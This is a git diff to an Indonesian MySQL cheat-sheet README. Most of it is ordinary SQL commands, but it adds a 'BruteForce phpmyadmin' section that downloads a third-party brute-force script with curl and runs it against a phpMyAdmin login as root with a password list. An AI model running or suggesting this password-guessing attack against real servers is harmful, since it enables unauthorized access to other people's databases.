@@ -23,6 +23,7 @@
     * [Buat Tabel](#buat-tabel)
     * [Untuk Melihat Struktur Tabel](#untuk-meliha-struktur-tabel)
     * [Hapus Tabel](#hapus-tabel)
+* [BruteForce phpmyadmin](#bruteForce-phpmyadmin)
     
 <br>
 <br>
@@ -176,4 +177,17 @@ DESC NamaTabel;
 ```
 DROP TABLE namaTabel;
 ```
+
+### BruteForce phpmyadmin
+```
+curl https://raw.githubusercontent.com/safflower/phpmyadmin-authentication-bruteforce/master/main.py > main.py
+```
+```
+python3 main.py -url http://example.com/pma/ -user root -dict password.txt
+```
+Bisa dilihat link dibawah ini :
+https://github.com/safflower/phpmyadmin-authentication-bruteforce
+
+
+
 ### Terima Kasih
